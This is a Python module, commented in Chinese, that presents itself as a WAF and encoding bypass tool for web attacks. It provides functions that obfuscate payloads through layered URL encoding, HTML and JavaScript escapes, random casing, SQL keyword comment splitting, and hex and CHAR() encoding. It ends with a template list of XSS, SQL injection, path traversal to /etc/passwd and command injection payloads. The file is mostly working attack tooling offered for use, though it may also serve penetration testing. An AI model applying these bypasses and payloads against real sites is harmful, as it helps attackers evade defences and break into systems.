"""WAF/编码绕过工具模块"""
import urllib.parse
import html
import base64
import random
import re


def url_encode(text: str, level: int = 1, encode_all: bool = False) -> str:
    """
    URL 编码
    :param text: 输入文本
    :param level: 编码层数 (1=单次, 2=双重, 3=三重)
    :param encode_all: 是否编码所有字符（包括字母数字）
    """
    result = text
    for _ in range(level):
        if encode_all:
            # 编码所有字符
            result = ''.join(f'%{ord(c):02X}' for c in result)
        else:
            # 只编码特殊字符
            result = urllib.parse.quote(result, safe='')
    return result


def url_decode(text: str, level: int = 1) -> str:
    """
    URL 解码
    :param text: 编码后的文本
    :param level: 解码层数
    """
    result = text
    for _ in range(level):
        result = urllib.parse.unquote(result)
    return result


def html_entity_encode(text: str, mode: str = 'decimal', padding: int = 0) -> str:
    """
    HTML 实体编码
    :param text: 输入文本
    :param mode: decimal(十进制), hex(十六进制), named(命名实体)
    :param padding: 前导零数量
    """
    result = []
    for char in text:
        if mode == 'decimal':
            if padding > 0:
                result.append(f'&#{str(ord(char)).zfill(padding)};')
            else:
                result.append(f'&#{ord(char)};')
        elif mode == 'hex':
            if padding > 0:
                result.append(f'&#x{format(ord(char), "x").zfill(padding)};')
            else:
                result.append(f'&#x{format(ord(char), "x")};')
        elif mode == 'named':
            # 尝试使用命名实体，否则用十进制
            try:
                named = html.escape(char)
                if named != char:
                    result.append(named)
                else:
                    result.append(f'&#{ord(char)};')
            except:
                result.append(f'&#{ord(char)};')
        else:
            result.append(char)
    return ''.join(result)


def html_entity_decode(text: str) -> str:
    """HTML 实体解码"""
    return html.unescape(text)


def js_escape(text: str, mode: str = 'hex') -> str:
    """
    JavaScript 转义编码
    :param text: 输入文本
    :param mode: octal(八进制), hex(十六进制), unicode(Unicode)
    """
    result = []
    for char in text:
        code = ord(char)
        if mode == 'octal':
            result.append(f'\\{code:o}')
        elif mode == 'hex':
            result.append(f'\\x{code:02x}')
        elif mode == 'unicode':
            result.append(f'\\u{code:04x}')
        else:
            result.append(char)
    return ''.join(result)


def js_unescape(text: str) -> str:
    """JavaScript 转义解码"""
    # 处理 \uXXXX
    text = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), text)
    # 处理 \xXX
    text = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), text)
    # 处理 \OOO (八进制)
    text = re.sub(r'\\([0-7]{1,3})', lambda m: chr(int(m.group(1), 8)), text)
    return text


def case_transform(text: str, mode: str = 'random') -> str:
    """
    大小写变形
    :param text: 输入文本
    :param mode: upper, lower, random, alternate
    """
    if mode == 'upper':
        return text.upper()
    elif mode == 'lower':
        return text.lower()
    elif mode == 'random':
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in text)
    elif mode == 'alternate':
        result = []
        upper = True
        for c in text:
            if c.isalpha():
                result.append(c.upper() if upper else c.lower())
                upper = not upper
            else:
                result.append(c)
        return ''.join(result)
    return text


def sql_comment_bypass(text: str) -> str:
    """
    SQL 注释绕过 - 在关键字中插入注释
    例如: select → sel/**/ect
    """
    keywords = ['select', 'union', 'from', 'where', 'and', 'or', 'insert', 'update', 'delete', 'drop']
    result = text
    for keyword in keywords:
        # 大小写不敏感替换
        pattern = re.compile(re.escape(keyword), re.IGNORECASE)
        def replace_with_comment(m):
            word = m.group(0)
            if len(word) <= 2:
                return word
            mid = len(word) // 2
            return word[:mid] + '/**/' + word[mid:]
        result = pattern.sub(replace_with_comment, result)
    return result


def hex_encode_sql(text: str) -> str:
    """
    SQL 十六进制编码
    字符串 → 0x 十六进制
    """
    return '0x' + text.encode().hex()


def char_encode_sql(text: str, db_type: str = 'mysql') -> str:
    """
    SQL CHAR() 函数编码
    :param db_type: mysql, mssql, oracle
    """
    chars = [str(ord(c)) for c in text]
    if db_type == 'mysql':
        return f"CHAR({','.join(chars)})"
    elif db_type == 'mssql':
        return '+'.join(f'CHAR({c})' for c in chars)
    elif db_type == 'oracle':
        return '||'.join(f"CHR({c})" for c in chars)
    return f"CHAR({','.join(chars)})"


def space_bypass(text: str, mode: str = 'comment') -> str:
    """
    空格绕过
    :param mode: comment(/**/), tab, newline, plus
    """
    replacements = {
        'comment': '/**/',
        'tab': '\t',
        'newline': '\n',
        'plus': '+',
        'parenthesis': '()',
    }
    replacement = replacements.get(mode, '/**/')
    return text.replace(' ', replacement)


def generate_all_encodings(text: str) -> dict:
    """生成所有常用编码形式"""
    return {
        'original': text,
        'url_encode': url_encode(text),
        'url_encode_all': url_encode(text, encode_all=True),
        'double_url_encode': url_encode(text, level=2),
        'triple_url_encode': url_encode(text, level=3),
        'html_decimal': html_entity_encode(text, 'decimal'),
        'html_hex': html_entity_encode(text, 'hex'),
        'html_decimal_padded': html_entity_encode(text, 'decimal', padding=7),
        'js_hex': js_escape(text, 'hex'),
        'js_octal': js_escape(text, 'octal'),
        'js_unicode': js_escape(text, 'unicode'),
        'case_random': case_transform(text, 'random'),
        'case_alternate': case_transform(text, 'alternate'),
        'base64': base64.b64encode(text.encode()).decode(),
        'sql_hex': hex_encode_sql(text),
        'sql_char_mysql': char_encode_sql(text, 'mysql'),
    }


# 常用 Payload 模板
PAYLOAD_TEMPLATES = {
    'xss_basic': '<script>alert(1)</script>',
    'xss_img': '<img src=x onerror=alert(1)>',
    'xss_svg': '<svg onload=alert(1)>',
    'xss_body': '<body onload=alert(1)>',
    'sqli_union': "' UNION SELECT 1,2,3--",
    'sqli_or': "' OR '1'='1",
    'sqli_comment': "admin'--",
    'lfi_basic': '../../../etc/passwd',
    'lfi_null': '../../../etc/passwd%00',
    'cmd_basic': '; ls -la',
    'cmd_pipe': '| cat /etc/passwd',
}

